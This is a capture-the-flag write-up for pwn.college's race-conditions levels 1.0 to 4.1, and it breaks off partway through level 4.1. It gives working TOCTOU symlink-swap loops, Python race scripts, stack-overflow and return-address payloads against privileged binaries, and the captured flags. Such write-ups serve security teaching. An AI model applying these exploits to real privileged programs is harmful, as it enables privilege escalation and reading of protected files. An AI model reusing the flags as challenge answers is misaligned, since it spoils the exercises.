---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/system-security/race-conditions
---

## level1.0

> Read the flag file, but the program verifies the path doesn't contain "flag" and that the file is not a symlink.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0
###
### Welcome to /challenge/babyrace_level1.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be sent to you.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
babyrace_level1.0: <stdin>:47: main: Assertion `argc > 1' failed.
Aborted
```

The program performs two checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).

After both checks pass, it opens the file and sends the contents to stdout.

### TOCTOU

The key insight is that these checks and the subsequent `open()` call are **not atomic**. There is a small window of time between the **check** (is it a symlink?) and the **use** (actually opening the file).

```
Timeline:
  Program:   [lstat check - NOT symlink ✓] ----gap---- [open() → reads file]
  Attacker:       ^real file here^          ^swap!^      ^symlink to /flag^
```

If we can swap a regular file for a symlink to `/flag` inside that window, the program will pass the check against the regular file but then open our symlink, leaking the real flag.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    /challenge/babyrace_level1.0 x
done
```

Eventually the program checks `x` when it is a normal file, then opens it after it has become a symlink to `/flag`, printing the flag.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0 x
pwn.college{rAc3C0nd1t10ns_TOCTOUl1v3s.0VMzIDL4ITM0EzW}
```

&nbsp;

## level1.1

> Exploit a basic race condition to get the flag.

```
hacker@race-conditions~level1-1:~$ /challenge/babyrace_level1.1 
###
### Welcome to /challenge/babyrace_level1.1!
###

babyrace_level1.1: <stdin>:40: main: Assertion `argc > 1' failed.
Aborted                    /challenge/babyrace_level1.1
```

This challenge is the exact same as [level1.0](#level10).

### Exploit

Terminal 1:

```
hacker@race-conditions~level1-1:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```
hacker@race-conditions~level1-1:~$ while true; do
    /challenge/babyrace_level1.0 x
done
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: file is a symlink!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

pwn.college{cHDaunhEvD4T9hYDJvi33NxNTe5.0lMwQDL4ITM0EzW}
```

&nbsp;

## level2.0

> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!

```text
hacker@race-conditions~level2-0:~$ /challenge/babyrace_level2.0
###
### Welcome to /challenge/babyrace_level2.0!
###
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Paused (press enter to continue)
```

Same TOCTOU vulnerability as [level1.0](#level10), but the program pauses between the `lstat` check and the `open()` call, making the race window much larger and easier to win.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    /challenge/babyrace_level2.0 x
done

# ---- snip ----

pwn.college{U8-2_E6AoYrIX5lnG5sdQMgCRBV.01MwQDL4ITM0EzW}
```

&nbsp;

## level2.1

> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!

```text
hacker@race-conditions~level2-1:~$ /challenge/babyrace_level2.1
###
### Welcome to /challenge/babyrace_level2.1!
###

babyrace_level2.1: <stdin>:40: main: Assertion `argc > 1' failed.
Aborted
```

This challenge is similar to level2.0 but with the `getchar()` pauses removed, making the race window much tighter.

### Source code analysis

```c title="/challenge/babyrace_level2.1 :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  size_t v4; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  v3 = open(argv[1], 0);
  v4 = read(v3, buf, 0x100uLL);
  write(1, buf, v4);
  puts("### Goodbye!");
  return 0;
}
```

### TOCTOU

Same TOCTOU vulnerability as level2.0 - `lstat` and `open()` are not atomic. Without the pauses however, the race window is only microseconds wide.

### Directory Maze

To widen the race window, we use a **directory maze**. Instead of racing on the file directly, we pass a deep path `top/b/c/d/e/x` and swap the top-level `top` symlink between two directory trees:

```text
Real tree:  top -> a,    a/b/c/d/e/x   = real small file
Fake tree:  top -> fake, fake/b/c/d/e/x = symlink to /flag
```

The deep path forces the kernel to resolve 5 directory levels for both `lstat` and `open()`, creating a wider window between the two syscalls. When `lstat("top/b/c/d/e/x")` runs, `top` points to `a` so it sees a real file and passes the symlink check. We then swap `top` to point to `fake` before `open()` runs, so it resolves to `fake/b/c/d/e/x` which is a symlink to `/flag`.

Using `os.symlink()` and `os.remove()` directly instead of `os.system()` avoids forking a shell on every swap, keeping the timing precise.

### Exploit

~/script.py

```python title="~/script.py" showLineNumbers
import subprocess, time, os

# Setup maze
os.system("rm -rf a fake top")
os.system("mkdir -p a/b/c/d/e && echo hi > a/b/c/d/e/x")
os.system("mkdir -p fake/b/c/d/e && rm -f fake/b/c/d/e/x && ln -s /flag fake/b/c/d/e/x")

print("[*] Starting exploit loop...")
attempt = 0

sleeps = [0.00001, 0.00005, 0.0001, 0.0002, 0.0005, 0.001, 0.002, 0.005]
sleep_idx = 0
sleep_val = sleeps[sleep_idx]

while True:
    attempt += 1

    if attempt % 200 == 0:
        sleep_idx = (sleep_idx + 1) % len(sleeps)
        sleep_val = sleeps[sleep_idx]
        print(f"[*] Attempt {attempt}, trying sleep={sleep_val}")

    # Fast swap using os module directly (no shell fork)
    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("a", "top")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level2.1", "top/b/c/d/e/x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    time.sleep(sleep_val)

    # Fast swap to fake
    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("fake", "top")

    out = proc.stdout.read()
    proc.wait()

    if b"pwn.college" in out:
        print(f"[+] Got the flag with sleep={sleep_val}!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level2-1:~$ python3 ~/script.py
[*] Starting exploit loop...
[*] Attempt 200, trying sleep=5e-05
[*] Attempt 400, trying sleep=0.0001
[*] Attempt 600, trying sleep=0.0002
[*] Attempt 800, trying sleep=0.0005
[*] Attempt 1000, trying sleep=0.001
[*] Attempt 1200, trying sleep=0.002
[*] Attempt 1400, trying sleep=0.005
[*] Attempt 1600, trying sleep=1e-05
[*] Attempt 1800, trying sleep=5e-05
[*] Attempt 2000, trying sleep=0.0001
[*] Attempt 2200, trying sleep=0.0002
[*] Attempt 2400, trying sleep=0.0005
[*] Attempt 2600, trying sleep=0.001
[*] Attempt 2800, trying sleep=0.002
[*] Attempt 3000, trying sleep=0.005
[*] Attempt 3200, trying sleep=1e-05
[*] Attempt 3400, trying sleep=5e-05
[*] Attempt 3600, trying sleep=0.0001
[*] Attempt 3800, trying sleep=0.0002
[*] Attempt 4000, trying sleep=0.0005
[+] Got the flag with sleep=0.0005!
###
### Welcome to /challenge/babyrace_level2.1!
###
pwn.college{gTJklkAFDSH2ncV-d5qjjCGPR3u.0FNwQDL4ITM0EzW}
### Goodbye!
```

&nbsp;

## level3.0

> Exploit a race condition to corrupt memory, affecting the behavior of the challenge.

```text
hacker@race-conditions~level3-0:~$ /challenge/babyrace_level3.0 /etc/passwd
###
### Welcome to /challenge/babyrace_level3.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Error: file is too large!
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

After both pauses and all checks pass, it opens and reads the file. Decompiling the binary reveals the following:

```c title="/challenge/babyrace_level3.0 :: Psedocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[256]; // [rsp+B0h] [rbp-110h] BYREF
  __int64 v7; // [rsp+1B0h] [rbp-10h]
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]
  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  v7 = 0LL;
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be read in.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the file is not larger than 256 bytes.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x51u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  printf("Value of \"win\" variable: %llx\n", v7);
  if ( v7 )
    win();
  puts("### Goodbye!");
  return 0;
}
```

There are two vulnerabilities at play here.

### TOCTOU

The checks and the subsequent `open()` call are **not atomic**. There is a window of time between the `lstat` check and the actual `open()` call:

```
Timeline:
  Program:  [lstat check - small file ✓] --- gap --- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
```

The program pauses with `getchar()` between the check and the open, making this window very wide and easy to exploit.

### Stack Buffer Overflow

`read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**. Looking at the stack layout:

```
char buf[256]   →  [rbp-110h]
__int64 v7      →  [rbp-10h]
```

The offset from `buf` to `v7` is `0x110 - 0x10 = 0x100` = **256 bytes**. So writing 264 bytes (256 to fill `buf` + 8 to overwrite `v7`) sets `v7` to a non-zero value, which triggers `win()`.

This means we don't need to swap to a symlink at all. We just need to:

1. Pass `lstat` with a small real file (`hi\n` = 3 bytes).
2. Swap to a 264-byte file **after** the lstat check but **before** `open()`.
3. `read()` overflows `buf` into `v7`, making it non-zero.
4. `win()` is called and prints the flag.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os

# Create overflow payload - 264 bytes to fill buf (256) + overwrite v7 (8 bytes)
payload = b"A" * 264
with open("bigfile", "wb") as f:
    f.write(payload)

print("[*] Starting exploit loop...")

attempt = 0
while True:
    attempt += 1

    # Start with a small real file to pass lstat
    os.system("rm -f x && echo hi > x")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level3.0", "x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    # Wait for program to reach first pause (lstat check)
    time.sleep(0.1)

    # Send first enter - lstat runs on small "hi" file, passes all checks
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except BrokenPipeError:
        proc.wait()
        continue

    # Swap x to the big file AFTER lstat check but BEFORE open()
    os.system("rm -f x && cp bigfile x")

    # Send second enter - open() reads bigfile, overflows buf into v7
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except BrokenPipeError:
        proc.wait()
        continue

    out = proc.stdout.read()
    proc.wait()

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break

    if b"Value" in out:
        line = [l for l in out.decode(errors='replace').splitlines() if "Value" in l]
        if line and "0" not in line[0].split(":")[-1].strip():
            print("[+] win variable non-zero!")
            print(out.decode(errors='replace'))
            break
```

```text
hacker@race-conditions~level3-0:~$ python ~/script.py
[*] Starting exploit loop...
[*] Attempt 1: Value of "win" variable: 4141414141414141
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level3.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)
Paused (press enter to continue)
Value of "win" variable: 4141414141414141
You win! Here is your flag:
pwn.college{YjdXcuUWNbwI3UnjvP86hY7QNs8.0VNwQDL4ITM0EzW}


### Goodbye!
```

&nbsp;

## level3.1

> Exploit a race condition to corrupt memory, affecting the behavior of the challenge.

```text
hacker@race-conditions~level3-1:~$ /challenge/babyrace_level3.1
###
### Welcome to /challenge/babyrace_level3.1!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

Decompiling the binary reveals the following:

```c title="/challenge/babyrace_level3.1 :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[256]; // [rsp+B0h] [rbp-110h] BYREF
  __int64 v7; // [rsp+1B0h] [rbp-10h]
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  v7 = 0LL;
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x49u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  if ( v7 )
    win();
  puts("### Goodbye!");
  return 0;
}
```

This is identical to [level3.0](#level30) with one critical difference: **the `getchar()` pauses are gone**. There is no artificial delay between the `lstat` check and the `open()` call, making the race window much tighter.

### TOCTOU

The checks and the subsequent `open()` call are still **not atomic**. The window between `lstat` and `open()` is now just natural CPU time - microseconds - but it still exists:

```text
Timeline:
  Program:  [lstat check - small file ✓] -tiny gap- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
```

### Stack Buffer Overflow

Same vulnerability as level3.0. `read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**:

```text
char buf[256]   →  [rbp-110h]
__int64 v7      →  [rbp-10h]
```

The offset from `buf` to `v7` is `0x110 - 0x10 = 0x100` = **256 bytes**. Writing 264 bytes overwrites `v7` with a non-zero value, triggering `win()`.

Since there are no pauses, we use a background thread to continuously swap `x` between a small file and the overflow payload as fast as possible, while hammering the binary in the main loop.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, os, threading

# Create overflow payload - 264 bytes to fill buf (256) + overwrite v7 (8 bytes)
payload = b"A" * 264
with open("bigfile", "wb") as f:
    f.write(payload)

print("[*] Starting exploit loop...")

stop = False
attempt = 0

def swapper():
    """Continuously swap x between small file and big file"""
    while not stop:
        os.system("rm -f x && echo hi > x")
        os.system("rm -f x && cp bigfile x")

# Start swap thread
t = threading.Thread(target=swapper, daemon=True)
t.start()

while not stop:
    attempt += 1

    try:
        out = subprocess.check_output(
            ["/challenge/babyrace_level3.1", "x"],
            stderr=subprocess.STDOUT,
            timeout=2
        )
    except subprocess.TimeoutExpired:
        continue
    except subprocess.CalledProcessError as e:
        out = e.output
    except Exception:
        continue

    if attempt % 1000 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        stop = True
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level3-1:~$ python ~/script.py
[*] Starting exploit loop...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level3.1!
###

You win! Here is your flag:
pwn.college{QaC5k6aR0cDMtWJ22pLmn4OzYaz.0lNwQDL4ITM0EzW}


### Goodbye!
```

&nbsp;

## level4.0

> Exploit a race condition to corrupt memory and smash the stack!

```
hacker@race-conditions~level4-0:~$ /challenge/babyrace_level4.0
###
### Welcome to /challenge/babyrace_level4.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
babyrace_level4.0: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

```c title="/challenge/babyrace_level4.0 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[256]; // [rsp+20h] [rbp-190h] BYREF
  struct stat stat_buf; // [rsp+120h] [rbp-90h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be read in.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the file is not larger than 256 bytes.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x4Cu, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  puts("### Goodbye!");
  return 0;
}
```

At first glance this looks similar to level3.0 - three checks, two pauses, and a `read()` into `buf`. However there are two key differences:

1. **No `win` variable** - there is no `v7` on the stack to overflow into.
2. **`buf` is never printed** - unlike level2.0, there is no `write(1, buf, v4)`. The file contents are read and silently discarded.

Checking the binary's defined functions reveals a `win()` function that is never called from `main`:

```text
pwndbg> info functions
...
0x00000000004012f6  win
0x00000000004013f3  main
...
```

Disassembling `win()` shows it opens `/flag` directly (hardcoded) and writes the contents to stdout:

```text
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00000000004012f6 <+0>:     endbr64
   0x00000000004012fa <+4>:     push   rbp
   0x00000000004012fb <+5>:     mov    rbp,rsp
   0x00000000004012fe <+8>:     lea    rdi,[rip+0xd03]        # 0x402008
   0x0000000000401305 <+15>:    call   0x401140 <puts@plt>
   0x000000000040130a <+20>:    mov    esi,0x0
   0x000000000040130f <+25>:    lea    rdi,[rip+0xd0e]        # 0x402024
   0x0000000000401316 <+32>:    mov    eax,0x0
   0x000000000040131b <+37>:    call   0x4011d0 <open@plt>
   0x0000000000401320 <+42>:    mov    DWORD PTR [rip+0x2d9a],eax        # 0x4040c0 <flag_fd.5683>
   0x0000000000401326 <+48>:    mov    eax,DWORD PTR [rip+0x2d94]        # 0x4040c0 <flag_fd.5683>
   0x000000000040132c <+54>:    test   eax,eax
   0x000000000040132e <+56>:    jns    0x401379 <win+131>
   0x0000000000401330 <+58>:    call   0x401130 <__errno_location@plt>
   0x0000000000401335 <+63>:    mov    eax,DWORD PTR [rax]
   0x0000000000401337 <+65>:    mov    edi,eax
   0x0000000000401339 <+67>:    call   0x4011f0 <strerror@plt>
   0x000000000040133e <+72>:    mov    rsi,rax
   0x0000000000401341 <+75>:    lea    rdi,[rip+0xce8]        # 0x402030
   0x0000000000401348 <+82>:    mov    eax,0x0
   0x000000000040134d <+87>:    call   0x401170 <printf@plt>
   0x0000000000401352 <+92>:    call   0x401190 <geteuid@plt>
   0x0000000000401357 <+97>:    test   eax,eax
   0x0000000000401359 <+99>:    je     0x4013f0 <win+250>
   0x000000000040135f <+105>:   lea    rdi,[rip+0xcfa]        # 0x402060
   0x0000000000401366 <+112>:   call   0x401140 <puts@plt>
   0x000000000040136b <+117>:   lea    rdi,[rip+0xd16]        # 0x402088
   0x0000000000401372 <+124>:   call   0x401140 <puts@plt>
   0x0000000000401377 <+129>:   jmp    0x4013f0 <win+250>
   0x0000000000401379 <+131>:   mov    eax,DWORD PTR [rip+0x2d41]        # 0x4040c0 <flag_fd.5683>
   0x000000000040137f <+137>:   mov    edx,0x100
   0x0000000000401384 <+142>:   lea    rsi,[rip+0x2d55]        # 0x4040e0 <flag.5682>
   0x000000000040138b <+149>:   mov    edi,eax
   0x000000000040138d <+151>:   call   0x4011a0 <read@plt>
   0x0000000000401392 <+156>:   mov    DWORD PTR [rip+0x2e48],eax        # 0x4041e0 <flag_length.5684>
   0x0000000000401398 <+162>:   mov    eax,DWORD PTR [rip+0x2e42]        # 0x4041e0 <flag_length.5684>
   0x000000000040139e <+168>:   test   eax,eax
   0x00000000004013a0 <+170>:   jg     0x4013c6 <win+208>
   0x00000000004013a2 <+172>:   call   0x401130 <__errno_location@plt>
   0x00000000004013a7 <+177>:   mov    eax,DWORD PTR [rax]
   0x00000000004013a9 <+179>:   mov    edi,eax
   0x00000000004013ab <+181>:   call   0x4011f0 <strerror@plt>
   0x00000000004013b0 <+186>:   mov    rsi,rax
   0x00000000004013b3 <+189>:   lea    rdi,[rip+0xd26]        # 0x4020e0
   0x00000000004013ba <+196>:   mov    eax,0x0
   0x00000000004013bf <+201>:   call   0x401170 <printf@plt>
   0x00000000004013c4 <+206>:   jmp    0x4013f1 <win+251>
   0x00000000004013c6 <+208>:   mov    eax,DWORD PTR [rip+0x2e14]        # 0x4041e0 <flag_length.5684>
   0x00000000004013cc <+214>:   cdqe
   0x00000000004013ce <+216>:   mov    rdx,rax
   0x00000000004013d1 <+219>:   lea    rsi,[rip+0x2d08]        # 0x4040e0 <flag.5682>
   0x00000000004013d8 <+226>:   mov    edi,0x1
   0x00000000004013dd <+231>:   call   0x401150 <write@plt>
   0x00000000004013e2 <+236>:   lea    rdi,[rip+0xd21]        # 0x40210a
   0x00000000004013e9 <+243>:   call   0x401140 <puts@plt>
   0x00000000004013ee <+248>:   jmp    0x4013f1 <win+251>
   0x00000000004013f0 <+250>:   nop
   0x00000000004013f1 <+251>:   pop    rbp
   0x00000000004013f2 <+252>:   ret
End of assembler dump.
```

### TOCTOU

Same wide race window as level3.0 - two `getchar()` pauses sit between the `lstat` check and `open()`:

```text
Timeline:
  Program:  [lstat check - small file ✓] --- gap --- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^ROP payload file^
```

### Stack Buffer Overflow + Return Address Overwrite

`read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**. The stack layout is:

```text
char buf[256]      →  rbp-190h
struct stat stat_buf  →  rbp-90h
saved rbp          →  rbp
return address     →  rbp+8
```

The offset from `buf` to the return address is `0x190 + 8` = **408 bytes**. By writing 400 bytes of padding + 8 bytes to overwrite saved rbp + the address of `win()`, we redirect execution to `win()` when `main` returns.

The payload must be delivered via the TOCTOU race:

1. Start `x` as a small real file (`hi`) to pass `lstat`.
2. After the first pause sends, swap `x` to a symlink pointing to `bigfile` (the ROP payload).
3. After the second pause sends, `open()` follows the symlink and `read()` loads the payload into the stack.
4. `main` returns → jumps to `win()` → prints the flag.

Note: `bigfile` is 416 bytes which exceeds the 256-byte size limit, but that check uses `lstat` which already ran on the small real file. The `open()` call does not re-check the size.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os
import struct

WIN_ADDR = 0x00000000004012f6

# 400 bytes padding + 8 bytes for saved rbp + win() address
payload = b"A" * 400 + b"B" * 8 + struct.pack("<Q", WIN_ADDR)

with open("bigfile", "wb") as f:
    f.write(payload)

print(f"[*] Payload size: {len(payload)} bytes")
print("[*] Starting exploit loop...")

attempt = 0
while True:
    attempt += 1
    os.system("rm -f x && echo hi > x")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level4.0", "x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    time.sleep(0.1)

    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except BrokenPipeError:
        proc.wait()
        continue

    # Swap to bigfile after lstat check passes
    try:
        os.remove("x")
    except FileNotFoundError:
        pass
    os.symlink(os.path.abspath("bigfile"), "x")

    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except BrokenPipeError:
        proc.wait()
        continue

    out = proc.stdout.read()
    proc.wait()

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level4-0:~$ python ~/script.py
[*] Payload size: 416 bytes
[*] Starting exploit loop...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level4.0!
###
Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Paused (press enter to continue)
### Goodbye!
You win! Here is your flag:
pwn.college{4Bil_Cct4WsoOmwazn5YrWmeMLs.01NwQDL4ITM0EzW}
```

&nbsp;

## level4.1

> Exploit a race condition to corrupt memory and smash the stack!

```text
hacker@race-conditions~level4-1:~$ /challenge/babyrace_level4.1
###
### Welcome to /challenge/babyrace_level4.1!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
babyrace_level4.1: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[256]; // [rsp+20h] [rbp-190h] BYREF
  struct stat stat_buf; // [rsp+120h] [rbp-90h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x44u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
